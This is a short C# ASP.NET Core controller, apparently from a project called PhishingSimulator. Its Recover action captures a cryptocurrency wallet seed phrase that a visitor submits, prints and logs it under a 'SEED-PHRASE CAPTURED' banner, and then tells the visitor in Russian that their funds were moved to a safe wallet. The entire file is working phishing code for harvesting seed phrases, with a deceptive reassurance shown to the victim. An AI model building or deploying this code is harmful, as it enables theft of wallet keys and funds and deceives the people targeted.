using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;

namespace PhishingSimulator.Controllers;

public class HomeController : Controller
{
    private readonly ILogger<HomeController> _logger;

    public HomeController(ILogger<HomeController> logger)
    {
        _logger = logger;
    }

    [HttpGet]
    public IActionResult Index()
    {
        return View();
    }

    [HttpPost]
    public IActionResult Recover(string seedPhrase)
    {
        if (!string.IsNullOrWhiteSpace(seedPhrase))
        {
            // Вывод seed-фразы в консоль (и в лог)
            Console.WriteLine("========== SEED-PHRASE CAPTURED ==========");
            Console.WriteLine($"Время: {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
            Console.WriteLine($"Фраза: {seedPhrase}");
            Console.WriteLine("==========================================");
            
            _logger.LogWarning($"Захвачена seed-фраза: {seedPhrase}");
        }

        // Имитация "безопасного перевода" – просто информационное сообщение
        ViewBag.Message = "Ваш аккаунт защищён! Средства переведены на безопасный кошелёк.";
        return View("Index");
    }
}